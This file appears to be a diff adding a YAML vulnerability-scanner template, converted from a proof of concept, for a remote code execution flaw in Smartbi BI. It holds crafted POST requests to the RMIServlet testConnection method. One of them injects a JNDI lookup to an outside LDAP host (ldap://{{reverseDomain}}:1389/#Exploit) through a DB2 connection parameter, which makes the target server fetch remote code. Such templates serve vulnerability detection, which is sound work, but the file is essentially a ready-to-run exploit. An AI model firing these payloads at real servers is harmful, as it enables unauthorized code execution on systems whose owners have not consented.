@@ -1,0 +1,38 @@
+id: yaml-poc-smartbi-smartbi_bi-command_injection-CT-529855
+info:
+  name: Yaml Poc Smartbi Smartbi_Bi Command_Injection Ct 529855
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-smartbi-smartbi_bi-command_injection-CT-529855'
+  tags: rce
+  reference:
+  - https://www.smartbi.com.cn/patchinfo
+http:
+- method: POST
+  path:
+  - /smartbi/vision/RMIServlet
+  body: className=BIConfigService&methodName=testConnection&params=["DB2_V9","","localhost:6688",":clientRerouteServerListJNDIName=","admin","",{"dameng6":false,"secret-key":null,"secret-key-encrypt-type":"0","token-timeout":"60","require-password":"false"}]
+  headers:
+    Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: POST
+  path:
+  - /smartbi/vision/RMIServlet
+  body: className=BIConfigService&methodName=testConnection&params=["DB2_V9","","localhost:6688","BLUDB:clientRerouteServerListJNDIName=ldap://{{reverseDomain}}:1389/#Exploit","admin","",{"dameng6":false,"secret-key":null,"secret-key-encrypt-type":"0","token-timeout":"60","require-password":"false"}]
+  headers:
+    Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+- method: POST
+  path:
+  - /vision/RMIServlet
+  body: className=BIConfigService&methodName=testConnection&params=["DB2_V9","","localhost:6688",":clientRerouteServerListJNDIName=","admin","",{"dameng6":false,"secret-key":null,"secret-key-encrypt-type":"0","token-timeout":"60","require-password":"false"}]
+  headers:
+    Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
